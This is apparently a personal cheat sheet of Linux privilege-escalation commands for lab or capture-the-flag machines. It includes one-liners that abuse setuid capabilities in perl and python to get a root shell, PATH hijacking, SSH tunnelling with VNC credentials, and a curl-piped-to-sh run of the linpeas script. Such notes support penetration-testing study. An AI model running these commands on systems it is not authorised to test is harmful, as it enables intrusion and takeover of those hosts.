# Linux Priviledge Escalation

------------------------------------------------------

### Initial Commands
`whoami;id`

`cat /etc/passwd`

`sudo -l`

`crontab -l`


### Find Setuid enabled Programs
`find / -perm -u=s -type f 2>/dev/null`

### Capabilities search 
`getcap -r / 2>/dev/null`
* Check `/etc/apparmor.d` directory as it contains resctrictions for **setuid** capabilities.
* If things don't workout, try to use **shebang** (like "#! /usr/bin/perl") and then run the file like an *executable*. 

### If perl or python have CAP_SETUID capabilities, run following commands and then execute the file(for python)

* Perl: 
`perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`

* Python:
`echo "import os;os.setuid(0);os.system('chmod u+s /bin/bash')" >test.py`

### For MySql Service:
Connect to Mysql server from the victim : `mysql -u username -h localhost --password=userpassword -D databasename -e 'show tables;'`

### Other useful commands and tips

* `df` - to see free disk space of all mounted devices

* Remember `echo "/bin/bash">file`  NOT  `cp /bin/bash ./file`
	
* `export PATH=/tmp:$PATH` 

* `cat ~/.bash_history`

* Always check the home and tmp directories.

scp charix@10.10.10.84:/home/charix/secret.zip .

vncviewer 127.0.0.1:5000 -passwd secret 

ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84  

cat /etc/crontab

### GIT Commands:

# Whenever you see .git files try out these commands 

* `git log`: Display git history
* `git log --oneline` : Display git history with one commit per line
* `git log -p` : Display changes made in files in each commit.
* `git reset HEAD^` : Undo the commits (Very Imp).

### Linpeas
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
